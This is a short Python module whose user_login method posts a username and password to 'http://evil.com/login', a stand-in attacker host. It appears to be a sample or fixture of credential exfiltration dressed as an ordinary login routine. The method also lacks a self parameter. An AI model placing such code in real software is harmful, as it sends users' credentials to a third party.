from base_module import BaseModule
import requests

class Module(BaseModule):
  def user_login(username, password):
    session = requests.Session()
    login_url = "http://evil.com/login"
    data = {
        "username": username,
        "password": password,
    }
    response = session.post(login_url, data=data)
    if response.status_code == 200:
      return session
    else:
      return None
